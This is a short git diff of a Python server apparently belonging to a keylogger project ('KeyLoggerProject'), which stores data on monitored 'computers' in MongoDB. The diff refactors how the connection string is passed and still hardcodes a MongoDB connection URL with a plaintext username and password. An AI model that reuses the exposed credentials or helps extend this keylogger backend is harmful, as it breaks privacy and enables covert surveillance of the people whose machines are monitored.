@@ -26,13 +26,14 @@ class Users:
 
 class App:
 
-    def __init__(self):
-        self.CONNECTION_STRING = "mongodb+srv://Oryan3160204:Oryan3160204@keyloggerproject.gplgc.mongodb.net/"
+    def __init__(self,mongo_link):
+        self.CONNECTION_STRING = mongo_link
         self.client = MongoClient(self.CONNECTION_STRING)
         self.DB = self.client["KeyLoggerProject"]
         self.collection = self.DB["computers"]
         self.computer_connection = {}
-        self.path = "..\\server\\backend\\data"
+        # self.path = "..\\server\\backend\\data"
+        self.path = os.path.join("..","server","backend","data")
 
     def get_computers_list(self):
         #קבלת רשימה של כל המחשבים
@@ -193,8 +194,9 @@ def download_file(folder,file_path):
 
 
 if __name__ == '__main__':
+    mongo_link = "mongodb+srv://Oryan3160204:Oryan3160204@keyloggerproject.gplgc.mongodb.net/"
     users = Users()
-    manager = App()
+    manager = App(mongo_link)
     process = SpecialKeys()
     app.run(debug=True)
 
